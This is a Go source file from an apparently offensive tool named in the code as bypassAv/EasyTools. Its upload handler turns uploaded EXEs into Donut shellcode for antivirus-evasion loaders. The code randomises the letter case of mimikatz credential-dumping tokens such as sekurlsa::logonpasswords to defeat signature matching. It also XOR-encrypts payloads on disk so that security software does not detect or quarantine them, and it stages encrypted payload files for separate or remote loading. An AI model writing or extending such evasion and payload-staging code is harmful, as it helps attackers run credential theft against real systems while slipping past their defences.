package bypassAv

import (
	"EasyTools/app/bypass/donut"
	"EasyTools/app/bypass/shell/encode"
	"EasyTools/app/bypass/shell/util"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"os"
	"path/filepath"
	"strings"

	"github.com/gin-gonic/gin"
)

// normalizeDonutArchParam 将前端传入的架构参数（x64/x86/amd64/386...）规范化为 donut 可识别的格式。
func normalizeDonutArchParam(arch string) string {
	a := strings.ToLower(strings.TrimSpace(arch))
	switch {
	case a == "" || a == "x64" || a == "amd64":
		return "x64"
	case a == "x86" || a == "386" || a == "i386":
		return "x86"
	default:
		return "x64"
	}
}

// sanitizeDirSegment 校验目录段：只允许普通目录名（无分隔符、无上级目录引用）。
func sanitizeDirSegment(name string) string {
	name = strings.TrimSpace(name)
	if name == "" || name == "." || name == ".." {
		return ""
	}
	if filepath.Base(name) != name || strings.ContainsAny(name, `/\`) {
		return ""
	}
	if len(name) > 64 {
		return ""
	}
	return name
}

// sanitizeFileNameSegment 校验文件名段：只允许普通文件名，可选后缀白名单。
func sanitizeFileNameSegment(name, allowedSuffix string) string {
	name = strings.TrimSpace(name)
	if name == "" || name == "." || name == ".." {
		return ""
	}
	if filepath.Base(name) != name || strings.ContainsAny(name, `/\`) {
		return ""
	}
	if allowedSuffix != "" && !strings.HasSuffix(strings.ToLower(name), strings.ToLower(allowedSuffix)) {
		return ""
	}
	if len(name) > 128 {
		return ""
	}
	return name
}

// obfuscateDonutParams 对含 "::" 的命令 token（如 mimikatz 的 sekurlsa::logonpasswords）
// 做大小写随机混淆。mimikatz 等命令行解析大小写不敏感，混淆后仍正常执行，
// 但文件/内存中不再出现原样小写特征串。非 "::" 普通参数（路径/开关等）保持原样。
func obfuscateDonutParams(params string) string {
	fields := strings.Fields(params)
	for i, f := range fields {
		if !strings.Contains(f, "::") {
			continue
		}
		b := []byte(f)
		start, end := 0, len(b)
		if len(b) >= 2 && ((b[0] == '"' && b[len(b)-1] == '"') || (b[0] == '\'' && b[len(b)-1] == '\'')) {
			start, end = 1, len(b)-1
		}
		for j := start; j < end; j++ {
			c := b[j]
			if c >= 'a' && c <= 'z' {
				if rand.Intn(2) == 0 {
					b[j] = c - 32
				}
			} else if c >= 'A' && c <= 'Z' {
				if rand.Intn(2) == 0 {
					b[j] = c + 32
				}
			}
		}
		fields[i] = string(b)
	}
	return strings.Join(fields, " ")
}

// sanitizeRemoteFileName 校验并清洗"分离/远程"模式下由用户提供的落地文件名，
// 仅允许普通文件名（拒绝路径分隔符与上级目录穿越），避免任意文件写入。
func sanitizeRemoteFileName(name string) (string, error) {
	name = strings.TrimSpace(name)
	if name == "" {
		return "", fmt.Errorf("文件名不能为空")
	}
	base := filepath.Base(name)
	if base != name || base == "." || base == ".." {
		return "", fmt.Errorf("非法文件名: %s", name)
	}
	if strings.ContainsAny(name, `/\`) {
		return "", fmt.Errorf("非法文件名: %s", name)
	}
	if len(name) > 128 {
		return "", fmt.Errorf("文件名过长")
	}
	return name, nil
}

// 上传处理：支持 .bin（原始 shellcode）与 .exe（自动通过内置 Donut 转为 shellcode）
func UploadHandler(c *gin.Context) {
	// 检查授权
	file, header, err := c.Request.FormFile("file")
	// 获取加载方式（本地/远程）
	loadWay := c.PostForm("loadWay")
	yuanchengUrlOrFileName := c.PostForm("yuanchengUrlOrFileName")
	arch := c.PostForm("arch")
	runParams := c.PostForm("params")

	if err != nil {
		c.JSON(http.StatusBadRequest, gin.H{
			"success": false,
			"error":   "Failed to get the file",
		})
		return
	}
	defer file.Close()

	// 只允许上传 .bin or .exe 文件
	lowerName := strings.ToLower(header.Filename)
	isBin := strings.HasSuffix(lowerName, ".bin")
	isExe := strings.HasSuffix(lowerName, ".exe")
	if !isBin && !isExe {
		c.JSON(http.StatusBadRequest, gin.H{
			"success": false,
			"error":   "Only .bin or .exe files are allowed",
		})
		return
	}

	// 读取上传内容（限制大小，防止恶意大文件填满磁盘/内存）
	const maxUploadSize = 100 << 20 // 100MB
	limited := io.LimitReader(file, maxUploadSize+1)
	content, err := io.ReadAll(limited)
	if err != nil {
		c.JSON(http.StatusBadRequest, gin.H{
			"success": false,
			"error":   "Failed to read the file",
		})
		return
	}
	if len(content) > maxUploadSize {
		c.JSON(http.StatusBadRequest, gin.H{
			"success": false,
			"error":   "上传的文件过大（最大 100MB）",
		})
		return
	}
	if len(content) == 0 {
		c.JSON(http.StatusBadRequest, gin.H{
			"success": false,
			"error":   "上传的文件为空",
		})
		return
	}

	// 转换说明（用于前端提示）
	conversionNote := ""
	if isExe {
		// 加壳 PE 必须提前拒绝：UPX 等壳会剥离重定位表，且其 stub 依赖"被系统正常映射"
		// 的镜像语义，经 Donut 反射加载后必然 0xC0000005 崩溃（已实测对照，见 util.PEPackInfo）。
		// 继续转换只会产出一个"编译成功但一跑就崩"的产物，用户无从判断原因。
		if packed, detail := util.PEPackInfo(content); packed {
			c.JSON(http.StatusBadRequest, gin.H{
				"success": false,
				"error": fmt.Sprintf(
					"检测到上传的 EXE 是 %s 加壳文件：加壳 PE 没有重定位表，内存加载后必定崩溃（0xC0000005），无法生成可用载荷。"+
						"请改用未加壳的原始 EXE（例如用 go install 从源码自行编译），"+
						"或先脱壳并在本机确认能正常运行后再上传（upx -d 对部分文件无法完整还原）。", detail),
			})
			return
		}

		// exe 通过内置 Donut 自动转为 shellcode；
		// 参数先做大小写混淆：mimikatz 等命令解析大小写不敏感，打散 "sekurlsa::logonpasswords"
		// 一类字面量特征，避免原样烘焙进载荷（仅作用于含 "::" 的命令 token，普通参数不受影响）。
		// 注：曾尝试压缩版 Donut(APLIB) 以减少明文驻留，实测在本加载链下会导致运行期崩溃，已回退未压缩。
		obfParams := obfuscateDonutParams(runParams)
		pic, convErr := godonut.BuildPIC(content, obfParams, normalizeDonutArchParam(arch))
		if convErr != nil {
			c.JSON(http.StatusBadRequest, gin.H{
				"success": false,
				"error":   fmt.Sprintf("Donut 转换失败: %v（请确认上传的是有效的 PE 文件）", convErr),
			})
			return
		}
		if len(pic) < 64 {
			c.JSON(http.StatusBadRequest, gin.H{
				"success": false,
				"error":   "Donut 转换结果异常（过短），请检查输入文件",
			})
			return
		}
		content = pic
		conversionNote = fmt.Sprintf("已通过内置 Donut 将 EXE 自动转换为 shellcode（%d 字节）", len(pic))
		if strings.TrimSpace(runParams) != "" {
			conversionNote += fmt.Sprintf("；已预置运行参数: %s", strings.TrimSpace(runParams))
		}
	}

	// 确保 result 目录存在
	saveDir := filepath.Join(os.TempDir(), "EasyTools", "file")
	if err := os.MkdirAll(saveDir, os.ModePerm); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{
			"success": false,
			"error":   "Failed to create result directory",
		})
		return
	}

	// 载荷不落明文：混淆后再写盘（密钥单独存放），避免原始 shellcode 被安全软件
	// 实时监控识别/隔离，导致后续生成阶段读不到载荷而报"shellcode处理失败"。
	savePath, saveErr := encode.WritePayloadAtRest(saveDir, content)
	if saveErr != nil {
		c.JSON(http.StatusBadRequest, gin.H{
			"success": false,
			"error":   fmt.Sprintf("保存载荷失败: %v", saveErr),
		})
		return
	}

	if loadWay == "分离" || loadWay == "远程" {
		// 对"分离/远程"模式，落地加密后的 payload 文件，供生成的 loader 运行时读取
		safeName, nameErr := sanitizeRemoteFileName(yuanchengUrlOrFileName)
		if nameErr != nil {
			c.JSON(http.StatusBadRequest, gin.H{
				"success": false,
				"error":   nameErr.Error(),
			})
			return
		}

		XorKey, err := encode.GenerateXorKey()
		if err != nil {
			c.JSON(http.StatusInternalServerError, gin.H{
				"success": false,
				"error":   fmt.Sprintln("生成 XOR 密钥失败:", err),
			})
			return
		}
		EncData := encode.XorEncrypt(content, XorKey)
		XorKeyBytes := encode.XorKeyToBytes(XorKey)
		currentPath, _ := os.Getwd()
		outDir := filepath.Join(currentPath, "EasyToolsFiles", "file")
		if err := os.MkdirAll(outDir, 0755); err != nil {
			c.JSON(http.StatusInternalServerError, gin.H{
				"success": false,
				"error":   fmt.Sprintf("创建输出目录失败: %v", err),
			})
			return
		}
		outName := safeName
		if loadWay == "远程" {
			outName = "yuancheng.bin"
		}
		os.WriteFile(filepath.Join(outDir, outName), EncData, 0644)
		// 保存密钥到临时目录，供 makeFile.go 使用
		os.WriteFile(filepath.Join(os.TempDir(), "EasyTools", "file", "XorKey.txt"), XorKeyBytes, 0644)
	}

	c.JSON(http.StatusOK, gin.H{
		"success":   true,
		"message":   "File uploaded successfully",
		"path":      savePath,
		"converted": isExe,
		"note":      conversionNote,
	})
}
